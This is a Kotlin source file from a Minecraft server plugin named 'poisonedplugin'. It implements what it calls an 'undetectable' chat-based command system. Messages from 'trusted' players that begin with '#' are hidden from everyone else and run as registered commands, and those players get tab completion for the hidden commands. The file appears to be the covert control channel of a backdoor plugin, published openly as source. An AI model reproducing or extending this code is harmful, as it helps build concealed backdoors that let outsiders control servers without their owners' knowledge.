/*
 * MIT License
 *
 * Copyright (c) 2023 Max Bossing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
@file:Suppress("deprecation")
package de.maxbossing.poisonedplugin.manager

import de.maxbossing.poisonedplugin.instance
import de.maxbossing.poisonedplugin.manager.TrustedUserManager.trusted
import de.maxbossing.poisonedplugin.utils.cmp
import de.maxbossing.poisonedplugin.utils.log
import de.maxbossing.poisonedplugin.utils.plus
import io.papermc.paper.event.player.AsyncChatEvent
import net.kyori.adventure.text.format.NamedTextColor
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer
import org.bukkit.Bukkit
import org.bukkit.entity.Player
import org.bukkit.event.EventHandler
import org.bukkit.event.EventPriority
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerChatEvent
import org.bukkit.event.player.PlayerJoinEvent

/**
 * Simple, Chat-Based and undetectable Command System
 */
object ChatCommandManager: Listener {
    val commands = mutableMapOf<String, (Player, List<String>) -> Unit>()

    val aliases = mutableMapOf<String, String>()

    val descriptions = mutableMapOf<String, String>()
    /**
     * register a chat command
     * @param command the command name
     * @param executor The Command Executor
     */
    fun register(
        command: String,
        description: String,
        aliases: List<String> = listOf(),
        executor: (Player, List<String>) -> Unit
    ) {
        commands += command to executor

        descriptions += command to description

        for (alias in aliases) {
            this.aliases += alias to command
        }
    }

    /**
     * Unregister a Command
     * @param command the Command to unregister
     */
    fun unregister(command: String) = commands.remove(command)

    /**
     * Command handler
     *
     * This is still the old sync chat event, as the new one fires async, which will break the commands if they have to do something synchronous
     */
    @EventHandler(priority = EventPriority.LOWEST)
    fun onChat(event: PlayerChatEvent) {

        if (!event.player.trusted)
            return

        var string = event.message

        if (!string.startsWith("#"))
            return

        event.isCancelled = true

        string = string.removePrefix("#")

        val splitted = string.split(" ").toMutableList()

        val command = splitted[0]

        splitted -= command

        if (commands.containsKey(command)) {
            commands[command]!!.invoke(event.player, splitted)
            log("${event.player.name} invoked command #$command")
        } else if (aliases.containsKey(command)) {
            commands[aliases[command]]!!.invoke(event.player, splitted)
            log("${event.player.name} invoked command #$command")
        } else {
            event.player.sendMessage(cmp("Command not found", NamedTextColor.RED))
        }
    }

    @EventHandler
    fun onJoin(event: PlayerJoinEvent) {
        if (!event.player.trusted)
            return
        event.player.addCustomChatCompletions(ChatCommandManager.commands.keys.map { "#$it" })
    }

    init {
        Bukkit.getPluginManager().registerEvents(this, instance)

        command("help", "Displays the help screen") { player, _ ->
            commands.forEach { t, _ ->
                player.sendMessage(
                    cmp("#$t", NamedTextColor.GOLD) + cmp(" - ") + cmp(descriptions[t]!!)
                )
            }
        }
    }
}

/**
 * Register a Chat Command
 * @param command The Command name
 * @param executor The Command Executor
 */
fun command(command: String, description: String, aliases: List<String> = listOf(),executor: (Player, List<String>) -> Unit) = ChatCommandManager.register(command, description, aliases, executor)